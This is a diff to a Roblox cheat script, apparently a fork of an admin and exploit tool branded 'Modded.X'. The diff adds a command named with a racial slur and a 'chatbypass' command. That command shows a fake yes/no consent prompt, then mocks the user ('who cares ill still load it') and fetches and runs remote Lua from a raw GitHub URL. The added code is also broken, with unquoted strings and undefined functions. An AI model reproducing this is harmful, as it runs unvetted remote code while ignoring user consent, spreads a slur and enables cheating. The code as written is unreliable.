@@ -1,24 +1,21 @@
----------------------------------------------------------------------------------------------------------------
---                                                                                                         
---  _____ ______   ________  ________  ________  _______   ________          ___    ___ 
--- |\   _ \  _   \|\   __  \|\   ___ \|\   ___ \|\  ___ \ |\   ___ \        |\  \  /  /|
--- \ \  \\\__\ \  \ \  \|\  \ \  \_|\ \ \  \_|\ \ \   __/|\ \  \_|\ \       \ \  \/  / /
---  \ \  \\|__| \  \ \  \\\  \ \  \ \\ \ \  \ \\ \ \  \_|/_\ \  \ \\ \       \ \    / / 
---   \ \  \    \ \  \ \  \\\  \ \  \_\\ \ \  \_\\ \ \  \_|\ \ \  \_\\ \       /     \/  
---    \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\     /  /\   \  
---     \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|    /__/ /\ __\ 
---                                                                          |__|/ \|__| 
--- 
--- 
--- ███╗   ███╗ █████╗ ██████╗ ███████╗    ██████╗ ██╗   ██╗     █████╗ ██╗     ███████╗██╗  ██╗
--- ████╗ ████║██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██║     ██╔════╝╚██╗██╔╝
--- ██╔████╔██║███████║██║  ██║█████╗      ██████╔╝ ╚████╔╝     ███████║██║     █████╗   ╚███╔╝ 
--- ██║╚██╔╝██║██╔══██║██║  ██║██╔══╝      ██╔══██╗  ╚██╔╝      ██╔══██║██║     ██╔══╝   ██╔██╗ 
--- ██║ ╚═╝ ██║██║  ██║██████╔╝███████╗    ██████╔╝   ██║       ██║  ██║███████╗███████╗██╔╝ ██╗
--- ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
---      
---                                                                                                                                                                                   
-----------------------------------------------------------------------------------------------------------------         
+--[[
+         _____ ______   ________  ________  ________  _______   ________          ___    ___ 
+        |\   _ \  _   \|\   __  \|\   ___ \|\   ___ \|\  ___ \ |\   ___ \        |\  \  /  /|
+        \ \  \\\__\ \  \ \  \|\  \ \  \_|\ \ \  \_|\ \ \   __/|\ \  \_|\ \       \ \  \/  / /
+         \ \  \\|__| \  \ \  \\\  \ \  \ \\ \ \  \ \\ \ \  \_|/_\ \  \ \\ \       \ \    / /   
+          \ \  \    \ \  \ \  \\\  \ \  \_\\ \ \  \_\\ \ \  \_|\ \ \  \_\\ \       /     \/  
+           \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\     /  /\   \  
+            \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|    /__/ /\ __\ 
+                                                                                 |__|/ \|__| 
+ 
+ 
+         ███╗   ███╗ █████╗ ██████╗ ███████╗    ██████╗ ██╗   ██╗     █████╗ ██╗     ███████╗██╗  ██╗
+         ████╗ ████║██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██║     ██╔════╝╚██╗██╔╝
+         ██╔████╔██║███████║██║  ██║█████╗      ██████╔╝ ╚████╔╝     ███████║██║     █████╗   ╚███╔╝ 
+         ██║╚██╔╝██║██╔══██║██║  ██║██╔══╝      ██╔══██╗  ╚██╔╝      ██╔══██║██║     ██╔══╝   ██╔██╗ 
+         ██║ ╚═╝ ██║██║  ██║██████╔╝███████╗    ██████╔╝   ██║       ██║  ██║███████╗███████╗██╔╝ ██╗
+         ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝    
+-- [[
 
 if IY_LOADED and not _G.IY_DEBUG == true then
     -- error("Modded.X is already running!", 0)
@@ -4779,6 +4776,7 @@ CMDs[#CMDs + 1] = {NAME = 'listento [player]', DESC = 'Listens to the area aroun
 CMDs[#CMDs + 1] = {NAME = 'unlistento', DESC = 'Disables listento'}
 CMDs[#CMDs + 1] = {NAME = 'jerk', DESC = 'Makes you jork it'}
 CMDs[#CMDs + 1] = {NAME = 'emptyserver', DESC = 'makes you join an empty server'}
+CMDs[#CMDs + 1] = {NAME = 'nigker', DESC = 'chat bypass lmao - key is patchmeplease'}
 wait()
 
 for i = 1, #CMDs do
@@ -7872,6 +7870,38 @@ addcmd('setfpscap', {'fpscap', 'maxfps'}, function(args, speaker)
 		end
 	else
 		return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setfpscap)')
+	end
+end)
+
+addcmd('chatbypass', {'nigker', 'nigka'}, function(args, speaker)
+local function showNotification(title, text)
+    local player = game.Players.LocalPlayer
+    game.StarterGui:SetCore("SendNotification", {
+        Title = title, 
+        Text = do you wish to proceed? Type yes or no.,    
+        Icon = "",      
+        Duration = 5    
+    })
+end
+ local chatMessage = player.Chatted:Connect(function(msg)
+        if msg:lower() == "yes" then
+            onYes()
+        elseif msg:lower() == "no" then
+            onNo()
+        end
+    end)
+end
+showNotification("Important Notice", "Do you wish to proceed? Type 'yes' or 'no'.")
+local function showNotification(title, text)
+    local player = game.Players.LocalPlayer
+    game.StarterGui:SetCore("SendNotification", {
+        Title = title,  
+        Text = who cares ill still load it lol. the key is "patchmeplease",    
+        Icon = "",      
+        Duration = 5     
+    })
+end
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/cheatplug/usercreated/refs/heads/main/main.lua'))()
 	end
 end)
 
